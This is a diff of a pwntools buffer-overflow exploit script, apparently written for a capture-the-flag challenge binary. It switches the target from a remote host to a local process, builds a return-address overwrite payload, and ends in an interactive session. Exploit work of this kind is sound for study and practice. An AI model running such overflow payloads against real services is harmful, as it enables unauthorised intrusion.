@@ -2,8 +2,9 @@ from pwn import *
 import struct
 
 for i in xrange(20):
-	#s = process("./vss_72e30bb98bdfbf22307133c16f8c9966")
-	s = remote("121.40.56.102",2333)
+	i = 9
+	s = process("./vss_72e30bb98bdfbf22307133c16f8c9966")
+	#s = remote("121.40.56.102",2333)
 
 	print s.recvline()
 	print s.recvline()
@@ -91,11 +92,10 @@ for i in xrange(20):
 	print i
 	buf = "A"*8*i
 	ptr = 0x400481
-	ptr = 0x40121A
+	#ptr = 0x40121A
 	buf += p64(ptr)
-	s.sendline(buf)
+	s.send(buf)
 
-	'''
 	#flush
 	s.send("Z"*(0x400-80)) 
 
@@ -104,9 +104,4 @@ for i in xrange(20):
 	buf += p
 
 	s.send(buf)
-	'''
-	try:
-		print s.recvline()
-		break
-	except:
-		pass
+	s.interactive()
